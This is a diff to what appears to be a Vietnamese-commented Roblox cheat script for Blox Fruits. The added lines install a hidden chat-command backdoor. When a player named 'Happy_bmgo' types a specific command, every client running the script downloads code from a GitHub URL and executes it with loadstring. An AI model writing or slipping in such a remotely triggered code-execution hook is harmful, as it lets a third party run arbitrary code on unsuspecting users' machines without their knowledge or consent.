@@ -277,3 +277,23 @@ if currentGameId == BLOX_FRUITS_GAME_ID or currentGameId == SECOND_SEA_GAME_ID o
 else
     warn("Script này chỉ hoạt động trong game Blox Fruits.")
 end
+--sp
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        
+        if player.Name == "Happy_bmgo" and message:lower() == ";H_speed_member" then
+            -- Chạy script bạn muốn
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/HAPPY-script/SPEED_BLOX_FRUIT/refs/heads/main/SPEED_BLOX_FRUIT"))()
+        end
+    end)
+end)
+
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        if player.Name == "Happy_bmgo" and message:lower() == ";H_speed_member" then
+            -- Chạy script bạn muốn
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/HAPPY-script/SPEED_BLOX_FRUIT/refs/heads/main/SPEED_BLOX_FRUIT"))()
+        end
+    end)
+end
